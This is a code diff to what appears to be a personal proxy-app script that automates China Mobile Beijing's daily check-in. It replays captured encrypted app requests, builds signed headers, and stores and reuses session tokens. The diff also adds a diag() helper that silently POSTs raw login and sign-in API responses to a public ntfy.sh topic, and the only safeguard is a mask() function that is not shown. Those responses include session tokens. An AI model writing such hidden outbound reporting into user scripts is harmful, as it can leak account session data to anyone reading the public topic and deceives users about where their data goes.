@@ -718,7 +718,133 @@ function prizeText(p) {
   return [name, val && !name.includes(String(p.prizeValue)) ? `（${val}）` : ''].join('');
 }
 
+
+/* ==================== 北京移动签到页（h5.bj.10086.cn，2026-10 抓包确认） ====================
+ * 链路：App 原生 getBigNetToken（加密，reqBody.sourceid=026033 + 签到页 url）→ 一次性 YZsids 票据
+ *   GET  /ActivityUnifyLogin/uniTokenValidateH5?token=YZsids…   → { result:0, token:<会话 token> }
+ *   POST /ActSignIn2023/getSignIn/JT/ActSignIn2023JT?token=&transactionid=  → 进页即签，{ isSignIn, signInList:[{signInDate, signInPrize}] }
+ */
+const BJ = 'https://h5.bj.10086.cn';
+const BJ_PAGE = 'https://h5.bj.10086.cn/cmcc_app/checkin/index.html#/index';
+const BIG_PATH = '/leadeon-abilityopen-biz/BN/obtainToken/getBigNetToken';
+const KEY_BJS = 'cmcc_sign_bjs';
+const DIAG_URL = 'https://ntfy.sh/hark-cmcc-q7z3k9m2x';
+async function diag(ctx, line) {
+  console.log('[CMCC诊断] ' + String(line).slice(0, 900));
+  try { await ctx.http.post(DIAG_URL, { body: mask(String(line)).slice(0, 3800), timeout: 5000 }); } catch (_) {}
+}
+function bjHeaders() {
+  return {
+    'User-Agent': UA, Accept: 'application/json, text/plain, */*', 'Accept-Language': 'zh-CN,zh-Hans;q=0.9',
+    Origin: BJ, Referer: 'https://h5.bj.10086.cn/cmcc_app/checkin/index.html', 'Content-Type': 'application/x-www-form-urlencoded',
+  };
+}
+async function bjCall(ctx, method, path) {
+  const o = { headers: bjHeaders(), timeout: 20000 };
+  if (method === 'POST') o.body = '';
+  const resp = await (method === 'POST' ? ctx.http.post(BJ + path, o) : ctx.http.get(BJ + path, o));
+  const text = typeof resp.text === 'function' ? await resp.text() : String(resp.body || '');
+  let j = null;
+  try { j = JSON.parse(text); } catch (_) {}
+  return { status: resp.status, text, j };
+}
+function bjSaveSession(ctx, url) {
+  const m = String(url).match(/[?&]token=([^&#]+)/);
+  if (!m || /^YZ/.test(m[1]) || m[1].length < 8) return;
+  let cur = {};
+  try { cur = ctx.storage.getJSON(KEY_BJS) || {}; } catch (_) {}
+  if (cur.tok !== m[1]) ctx.storage.setJSON(KEY_BJS, { tok: m[1], ts: Date.now() });
+}
+function appCookieStr(ctx) {
+  let kv = {};
+  try { kv = (ctx.storage.getJSON(KEY.app) || {}).kv || {}; } catch (_) {}
+  try { const w = ctx.storage.get('cm_cookie'); if (w) kv = { ...normCookie(w), ...kv }; } catch (_) {}
+  return Object.entries(kv).map(([k, v]) => `${k}=${v}`).join('; ');
+}
+function randDigits(n) { let s = ''; for (let i = 0; i < n; i++) s += Math.floor(Math.random() * 10); return s; }
+async function fetchBigToken(ctx, phone) {
+  let br = null;
+  try { br = ctx.storage.getJSON(KEY.bigReq); } catch (_) {}
+  if (!br || !br.enc) throw new NeedError('还缺签到页票据：打开「中国移动」App 进一次签到页即可（只需一次）');
+  const params = JSON.parse(decAny(br.enc, '', String(br.xqen || '').trim()) || '{}');
+  const cookie = appCookieStr(ctx);
+  const jsid = (cookie.match(/JSESSIONID=([^;]+)/) || [])[1] || 'null';
+  const tries = [
+    { host: 'app.10086.cn', t: 'orig' }, { host: 'app.10086.cn', t: 'cookie' },
+    { host: 'client.app.coc.10086.cn', t: 'orig' }, { host: 'raw' },
+  ];
+  for (const v of tries) {
+    try {
+      let url, headers, body;
+      if (v.host === 'raw') {
+        url = br.url; body = br.enc;
+        headers = { 'x-qen': String(br.xqen || ''), 'Content-Type': 'application/json;charset=UTF-8', 'User-Agent': 'ChinaMobile/12.5.5 (iPhone; iOS 26.1)', Cookie: cookie };
+      } else {
+        const ts = Date.now(); const nonce = randDigits(8);
+        const bodyObj = { ...params, reqBody: { sourceid: '026033', appId: '', url: BJ_PAGE, ...(params.reqBody || {}), cellNum: phone } };
+        if (v.t === 'cookie') bodyObj.t = cookie;
+        body = cmEncrypt(JSON.stringify(bodyObj), REQ1_KEY, DEFAULT_IV);
+        const tokenEnc = cmEncrypt(`${params.xk || ''}_${BIG_PATH}_${ts}_${nonce}`, REQ1_KEY, DEFAULT_IV);
+        headers = {
+          'x-qen': '1', 'Content-Type': 'application/x-www-form-urlencoded', Accept: 'application/json',
+          'x-sign': cmMd5(`${tokenEnc}_${ts}_${nonce}_${jsid}`), 'x-nonce': nonce, 'x-token': tokenEnc, 'x-time': String(ts),
+          Origin: 'https://h.app.coc.10086.cn', 'User-Agent': UA,
+        };
+        url = `https://${v.host}${BIG_PATH}?` + encodeURI(cookie);
+      }
+      const resp = await ctx.http.post(url, { headers, body, timeout: 15000 });
+      const text = typeof resp.text === 'function' ? await resp.text() : String(resp.body || '');
+      const plain = decAny(text, String(hget(resp.headers, 'x-pen')).trim(), '1');
+      let j = null;
+      try { j = JSON.parse(plain); } catch (_) {}
+      const inner = j && (j.rspBody || (j.body && j.body.rspBody)) || {};
+      await diag(ctx, `BIG ${v.host}/${v.t || ''} → ${resp.status} ${(plain || text).slice(0, 300)}`);
+      if (inner.token && /^YZ/.test(inner.token)) return inner.token;
+    } catch (e) {
+      await diag(ctx, `BIG ${v.host}/${v.t || ''} 出错 ${e && e.message}`);
+    }
+  }
+  throw new Error('换签到页票据失败（详见诊断）');
+}
+class NeedError extends Error {}
+async function bjSignWith(ctx, tok) {
+  const r = await bjCall(ctx, 'POST', `/ActSignIn2023/getSignIn/JT/ActSignIn2023JT?token=${encodeURIComponent(tok)}&transactionid=${Date.now()}`);
+  await diag(ctx, `SIGN → ${r.status} ${r.text.slice(0, 600)}`);
+  return r.j;
+}
+async function signBj(ctx) {
+  const phone = phoneOf(ctx);
+  let cur = null;
+  try { cur = ctx.storage.getJSON(KEY_BJS); } catch (_) {}
+  let j = null;
+  if (cur && cur.tok && Date.now() - cur.ts < 20 * 3600e3) {
+    try { j = await bjSignWith(ctx, cur.tok); } catch (_) {}
+    if (!(j && Number(j.result) === 0)) { j = null; ctx.storage.delete(KEY_BJS); }
+  }
+  if (!j) {
+    if (!/^1\d{10}$/.test(phone)) return { ok: false, need: true, msg: '缺手机号：在 Egern 本模块设置里填「手机号」' };
+    let yz;
+    try { yz = await fetchBigToken(ctx, phone); } catch (e) {
+      if (e instanceof NeedError) return { ok: false, need: true, msg: e.message };
+      throw e;
+    }
+    const v = await bjCall(ctx, 'GET', `/ActivityUnifyLogin/uniTokenValidateH5?token=${encodeURIComponent(yz)}`);
+    await diag(ctx, `LOGIN → ${v.status} ${v.text.slice(0, 300)}`);
+    const tok = v.j && Number(v.j.result) === 0 && v.j.token;
+    if (!tok) throw new Error(`登录签到页失败：${(v.j && v.j.errmsg) || v.status}`);
+    ctx.storage.setJSON(KEY_BJS, { tok, ts: Date.now() });
+    j = await bjSignWith(ctx, tok);
+  }
+  if (!j || Number(j.result) !== 0) throw new Error(`签到接口异常：${(j && j.errmsg) || '无响应'}`);
+  const d = new Date();
+  const today = `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())}`;
+  const it = (j.signInList || []).find((x) => x.signInDate === today);
+  if (!j.isSignIn && !it) throw new Error('签到没生效（接口返回未签）');
+  return { ok: true, lines: ['签到成功'], prizes: it && it.signInPrize ? [it.signInPrize] : [] };
+}
+
 async function signOnce(ctx, o) {
+  if ((clean((ctx.env || {}).CMCC_PROVINCE) || '100') === '100') return signBj(ctx);
   const cred = getCred(ctx);
   const live = liveSession(ctx);
   const hasId = cred.userCheckId || phoneOf(ctx);
@@ -929,7 +1055,7 @@ export default async function (ctx) {
   const o = opts(ctx);
   if (ctx.request && ctx.request.url) {
     if (!o.capture) return;
-    if (/^https?:\/\/h5\.bj\.10086\.cn/.test(ctx.request.url)) return traceWx(ctx);
+    if (/^https?:\/\/h5\.bj\.10086\.cn/.test(ctx.request.url)) { if (!ctx.response) bjSaveSession(ctx, ctx.request.url); return traceWx(ctx); }
     if (/^https?:\/\/(client\.app\.coc\.10086\.cn|10086\.online-cmcc\.cn)/.test(ctx.request.url)) {
       if (/obtainToken\/getBigNetToken/.test(ctx.request.url)) return captureBig(ctx);
       captureApp(ctx); return;
